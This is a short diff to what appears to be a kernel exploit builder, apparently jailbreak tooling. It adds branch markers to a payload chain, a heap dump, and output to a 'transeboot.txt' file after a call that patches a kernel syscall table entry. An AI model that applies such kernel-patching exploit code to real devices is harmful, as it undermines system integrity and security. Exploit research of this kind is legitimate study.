@@ -62,5 +62,13 @@ def pwn(addrs):
 
 pwn([cfg['#kern']['sysent_8_patch']] * 0x51)
 
+mback = marker().mark()
+mforward = marker()
+
+condbranch_r0(mback, mforward)
+
+mforward.mark()
+
 final = finalize(0x10000000)
+heapdump(cache)
 open('transeboot.txt', 'w').write(final)
